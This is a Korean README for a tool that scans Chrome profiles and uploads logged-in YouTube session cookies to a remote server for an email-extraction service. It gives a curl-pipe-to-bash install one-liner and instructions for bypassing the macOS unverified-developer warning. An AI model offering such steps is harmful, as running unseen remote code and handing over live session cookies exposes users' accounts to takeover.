# YouTube Cookie Uploader

YouTube 비즈니스 이메일 추출 서비스를 위한 쿠키 전송 도구입니다.

## 실행 (macOS)

터미널에 아래 한 줄을 붙여넣고 Enter:

```bash
curl -fsSL https://raw.githubusercontent.com/2ndlifeinc/yt_crawler_public/main/install.sh | bash
```

## 실행 (Windows)

[Releases](https://github.com/2ndlifeinc/yt_crawler_public/releases)에서 `yt_cookie_uploader-windows-x64.exe`를 다운로드하고 더블클릭하세요.

## 어떻게 동작하나요?

1. 실행하면 Chrome 프로필을 자동으로 스캔합니다
2. Chrome 프로필을 자동으로 스캔합니다
3. YouTube에 로그인된 계정이 표시됩니다
4. 전송할 계정을 선택하면 자동으로 서버에 전송됩니다

> macOS에서 "확인되지 않은 개발자" 경고가 나타나면:
> 시스템 설정 > 개인정보 보호 및 보안 > "확인 없이 열기" 를 클릭하세요.

## 주의사항

- Chrome에서 **YouTube에 로그인된 상태**에서 실행해야 합니다
- 쿠키는 시간이 지나면 만료됩니다. 이메일 추출이 실패하면 다시 실행해주세요
